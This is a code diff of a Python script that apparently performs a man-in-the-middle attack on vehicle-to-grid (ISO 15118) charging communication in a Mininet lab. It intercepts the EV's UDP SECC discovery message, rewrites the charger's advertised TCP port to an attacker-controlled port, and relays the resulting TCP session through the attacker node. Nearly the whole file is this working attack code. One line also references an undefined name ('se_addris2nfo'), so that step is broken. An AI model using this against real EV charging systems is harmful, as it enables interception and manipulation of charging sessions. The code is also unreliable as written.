@@ -1,58 +1,145 @@
 import socket
-from v2g_client import Client
+from v2g_client import TCPClient, TCPServer
+from binascii import hexlify
+
+class V2GTPMessage:
+    '''
+    Constructs a V2G Transfer Protocol message containing the header 
+    (which consists of the protocol version, the inverse protocol version, 
+    the payload type and payload length) and the payload.
+    data: raw bytes from stream
+    '''
+    def __init__(self, data):
+        '''
+        data: raw data bytes as input 
+        '''
+        self.data = data
+        self.protocol_version = data[0]
+        self.inverse_protocol_version = data[1]
+        self.payload_type = data[2:4]
+        self.payload_length = data[4:8]
+        self.payload = data[8:]
+
+class SECCDiscoveryRes(V2GTPMessage):
+    '''
+    Initializes the payload of a SECCDiscovery response.
+    '''
+    def __init__(self, data):
+        '''
+        This class processes the payload.
+        data: raw data bytes as input.
+        '''
+
+        super().__init__(data)
+        self.secc_ip_address = self.payload[:16]
+        self.secc_port = int.from_bytes(self.payload[16:18],byteorder='big')
+        self.set_security = self.payload[18:19] # [0]
+        self.set_transport_protocol = self.payload[19:20] # [0]
+     
+    def get_altered_data(self, port):
+        '''
+        Alters the TCP port of SECC.
+        '''
+        secc_port = port
+        # alter payload
+        payload = bytearray(self.payload)
+        payload[16:18] = (secc_port).to_bytes(2,byteorder='big')
+        # alter data
+        data = bytearray(self.data)
+        data[8:] = payload
+        return SECCDiscoveryRes(data)
 
 if __name__ == "__main__":
 
-    # HOW RiseV2G works
+    # CONSTANTS
+    V2G_UDP_SDP_SERVER_PORT = 15118
+    MOD_UDP_SDP_SERVER_PORT = V2G_UDP_SDP_SERVER_PORT + 1
+    SECC_FAKE_PORT = 20000
+
+    # read ips from local file
+    f = open(".common_ips.txt", "r")
+    se_IPv6 = f.readline().rstrip()
+    ev_IPv6 = f.readline()
+    print("se_IPv6: %s" % se_IPv6)
+    print("ev_IPv6: %s" % ev_IPv6)
+    f.close()
+
+    se_addrinfo = socket.getaddrinfo('%s%s' % (se_IPv6,'%mim-eth0'), V2G_UDP_SDP_SERVER_PORT, socket.AF_INET6, socket.SOCK_DGRAM)
+
+    # RiseV2G
     
-    # step 1) get udp messages
+    # normal flow
+    # UDP: ev1          -> se1:15118
+    # UDP: se1:15118    -> ev1
 
-    # UDP: ev1       -> se1:15118
-    # UDP: se1:15118 -> ev1
-    # UDP socket listening to 15118
+    # modified flow
+    # a) UDP: ev1             -> mim:15118(->9)
+    # b) UDP: mim:15120       -> se1:15118
+    # c) UDP: se1:15118       -> mim:15120
+    # d) UDP: mim:15119(->8)    -> ev1
 
-    se_port = 15118
+    upd_communication_finished = False
     with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s:
-        # se_port + 1 because otherwise mininet won't allow another person listening on the same port  
-        print('listening on port %d' % (se_port + 1))
-        s.bind(('',se_port + 1))
-        while True:
-            data, addr = s.recvfrom(72) # len = 10, 72
-            addr_ip = addr[0] # ip of source
-            addr_port = addr[0] # UDP port of ev1
-            print("%s:%s (len=%d) : %s" % (addr_ip, addr_port, len(data), data))
+        print('Sniffing UDP messages from ev to se on port %s, changed by flow to %d' % (V2G_UDP_SDP_SERVER_PORT, MOD_UDP_SDP_SERVER_PORT))
+        s.bind(('',MOD_UDP_SDP_SERVER_PORT))
+        while not upd_communication_finished:
+            # a)
+            ev1_data, addr = s.recvfrom(72)
+            ev1_ip = addr[0]
+            udp_ev1_port = addr[1] # UDP port of ev1
+            print("EV->MIM %s:%s" % (ev1_ip, udp_ev1_port))
+            print("(len=%d) : %s" % (len(ev1_data), ev1_data))
             # send udp packet to the real destination
             with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s2:
-                se_addrinfo = socket.getaddrinfo('fe80::61:94ff:fe32:a53a%s' % ('%mim-eth0'), se_port, socket.AF_INET6, socket.SOCK_DGRAM)
-                (family, socktype, proto, canonname, se_sockaddr) = se_addrinfo[0]
-                s2.sendto(data, se_sockaddr)
-
-    # TCP messages which can be
-    # ev1 -> se1
-    # se1 -> ev1
-
-    # se1 ipv6
-    # addrinfo = socket.getaddrinfo('fe80::61:94ff:fe32:a53a%s' % ('%mim-eth0'), 20, socket.AF_INET6, socket.SOCK_STREAM)
-    # (family, socktype, proto, canonname, sockaddr) = addrinfo[0]
-    # se1 = Client(addrinfo)
-    # connected = False
-    # while not connected:
-    #     try:
-    #         se1.connect() # connect mim to se1
-    #         connected = True
-    #     except:
-    #         pass
-
-    # with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:  
-    #     port = 202
-    #     print('listening on port %d' % port)
-    #     s.bind(('',port))
-    #     s.listen(2)
-    #     conn, addr = s.accept()
-    #     with conn:
-    #         print(addr, "has connected")
-    #         while True:    
-    #             recv = conn.recv(1024)
-    #             se1.send(recv)
-    #             resp = se1.get_response()
+                print('Sniffing UDP messages from se to ev on port %s, change by flow to %d' % (udp_ev1_port, V2G_UDP_SDP_SERVER_PORT + 2))
+                # s2.bind(('',V2G_UDP_SDP_SERVER_PORT + 2))  # my fixed port
+                # b)
+                (family, socktype, proto, canonname, se1_ip) = se_addris2nfo[0]
+                print("MIM->SE (fw) %s:%d" % (se1_ip[0], V2G_UDP_SDP_SERVER_PORT))
+                s2.sendto(ev1_data, se1_ip)
+                while not upd_communication_finished:
+                    se1_data, addr = s2.recvfrom(90)
+                    se1_ip = addr[0] # ip of se1
+                    udp_se1_port = addr[1] # UDP port of se1
+                    print("SE->MIM %s:%s" % (se1_ip, udp_se1_port))
+                    print("(len=%d) : %s" % (len(se1_data), hexlify(se1_data)))
+                    secc_udp_response = SECCDiscoveryRes(se1_data)
+                    # alter port
+                    altered_secc_udp_response = secc_udp_response.get_altered_data(port=SECC_FAKE_PORT)
+                    print("V2GTPMessage contains TCP secc_ip:secc_port: %s:%s, port altered to %s" % (hexlify(secc_udp_response.secc_ip_address), secc_udp_response.secc_port, altered_secc_udp_response.secc_port))
+                    ev_addrinfo = socket.getaddrinfo('%s%s' % (ev1_ip, '%mim-eth0'), udp_ev1_port, socket.AF_INET6, socket.SOCK_DGRAM)
+                    (family, socktype, proto, canonname, ev_sockaddr) = ev_addrinfo[0]
+                    print("MIM->EV %s:%s)" % (ev_sockaddr, udp_ev1_port))
+                    s.sendto(altered_secc_udp_response.data, ev_sockaddr)
+                    upd_communication_finished = True
     
+    # TCP exchanges begin now
+
+    # normal flow
+    # TCP: ev1:EVCC_PORT    -> se1:SECC_PORT
+    # TCP: se1:SECC_PORT    -> ev1:EVCC_PORT
+
+    # modified flow
+    # TCP: ev1:EVCC_PORT        -> mim:SECC_FAKE_PORT (fixed to 20000 by modifying the UDP message)
+    # TCP: mim:RAND_PORT        -> se1:SECC_PORT 
+    # TCP: se1:SECC_PORT        -> mim:RAND_PORT
+    # TCP: mim:SECC_FAKE_PORT   -> ev1:EVCC_PORT
+
+    # TCP socket: connect mim to the server
+    se_addrinfo = socket.getaddrinfo('%s%s' % (se1_ip,'%mim-eth0'), secc_udp_response.secc_port, socket.AF_INET6, socket.SOCK_STREAM)
+    
+    se1 = TCPClient(se_addrinfo)
+    se1.connect() # connect mim to se1    
+
+    mim = TCPServer(SECC_FAKE_PORT)
+    ev1_conn, addr = mim.accept() # waits for ev1 to connect
+    with ev1_conn:
+        print(addr, "has connected")
+        while ev1_data != b'':
+            ev1_data = ev1_conn.recv(1024)
+            se1.send(ev1_data)
+            se1_data = se1.get_response()
+            ev1_conn.send(se1_data)
+    
+    mim.close()
+    se1.close()
